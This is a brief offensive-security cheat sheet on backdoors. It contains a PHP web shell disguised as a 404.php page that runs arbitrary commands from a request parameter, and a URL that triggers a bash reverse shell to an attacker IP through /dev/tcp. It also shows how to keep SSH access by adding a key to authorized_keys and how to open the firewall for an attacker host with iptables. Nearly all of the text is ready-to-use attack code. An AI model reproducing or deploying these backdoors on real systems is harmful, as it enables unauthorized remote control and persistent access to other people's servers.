# Backdoors cheatsheets

### PHP backdoor 
> /var/www/html/404.php
```php
<?php 

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }

?>
```
#### Accessing backdoor php
```bash
http://<target-ip>/404.php?cmd=bash -i >& /dev/tcp/<local-ip>/4444 0>&1
```
## SSH Key-Based backdoor
```bash
# generate ssh keys
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "PA$$word@123"

# Install Public Key to target server
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# Set Permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# connecting remote target host
ssh -i id_rsa username@target.com
```
## Firewall bypass root privileges required
```bash
# List the iptables settings
iptables --list

# ACCEPT: TARGET => ATTACKER
# OUTPUT 1: The first rule of the OUTPUT chain.
# -d: Destination address
iptables -I OUTPUT 1 -p tcp -d <attacker-ip> -j ACCEPT

# ACCEPT: TARGET <= ATTACKER
# INPUT 1: The first rule of the INPUT chain.
# -s: Source address
iptables -I INPUT 1 -p tcp -s <attacker-ip> -j ACCEPT
```
